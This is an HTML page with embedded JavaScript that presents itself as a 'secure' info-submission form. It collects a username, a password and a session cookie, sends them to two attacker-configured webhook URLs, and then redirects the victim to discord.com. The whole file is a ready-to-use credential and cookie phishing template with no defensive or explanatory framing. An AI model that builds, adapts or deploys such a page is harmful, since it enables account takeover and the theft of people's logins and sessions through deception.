<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Webhook Form</title>
  <style>
    :root {
      --bg-dark: #1a202c;
      --bg-mid: #2d3748;
      --bg-light: #4a5568;
      --accent: #3b82f6;
      --accent-hover: #2563eb;
      --text-light: #fff;
      --text-muted: #cbd5e0;
      --highlight: #fbbf24;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, var(--bg-dark), var(--bg-mid));
      color: var(--text-light);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .form-container {
      background-color: var(--bg-light);
      padding: 2.5rem 2rem;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
      max-width: 400px;
      width: 100%;
      animation: fadeIn 0.5s ease;
    }

    h1 {
      text-align: center;
      font-size: 2rem;
      color: var(--highlight);
      margin-bottom: 1.5rem;
    }

    input[type="text"] {
      width: 100%;
      padding: 14px 16px;
      border: 2px solid var(--bg-mid);
      border-radius: 10px;
      background-color: var(--bg-dark);
      color: var(--text-light);
      font-size: 1rem;
      margin-bottom: 1rem;
      transition: 0.3s;
    }

    input[type="text"]:focus {
      border-color: var(--highlight);
      outline: none;
      background-color: var(--bg-mid);
    }

    button {
      background-color: var(--accent);
      color: white;
      border: none;
      padding: 14px;
      width: 100%;
      font-size: 1.1rem;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: var(--accent-hover);
    }

    .footer {
      text-align: center;
      margin-top: 1rem;
      font-size: 0.85rem;
      color: var(--text-muted);
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <div class="form-container">
    <h1>Submit Info</h1>
    <form id="textForm">
      <input type="text" id="usernameInput" placeholder="Username" required />
      <input type="text" id="passwordInput" placeholder="Password" required />
      <input type="text" id="cookieInput" placeholder="Cookie" required />
      <input type="text" id="webhookInput" placeholder="Webhook (optional)" />
      <button type="submit">Send</button>
    </form>
    <p class="footer">Your information is processed securely.</p>
  </div>

  <script>
    const webhookUrl1 = "YOUR_WEBHOOK_URL_1";
    const webhookUrl2 = "YOUR_WEBHOOK_URL_2";

    document.getElementById("textForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.getElementById("usernameInput").value;
      const password = document.getElementById("passwordInput").value;
      const cookie = document.getElementById("cookieInput").value;
      const webhook = document.getElementById("webhookInput").value;

      const payload = {
        content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
      };

      const sendToWebhook = url => fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      Promise.all([
        sendToWebhook(webhookUrl1),
        sendToWebhook(webhookUrl2)
      ])
      .then(() => {
        alert("Data sent successfully.");
        window.location.href = "https://discord.com";
      })
      .catch(error => {
        alert(`Error: ${error.message}`);
      });
    });
  </script>

</body>
</html>
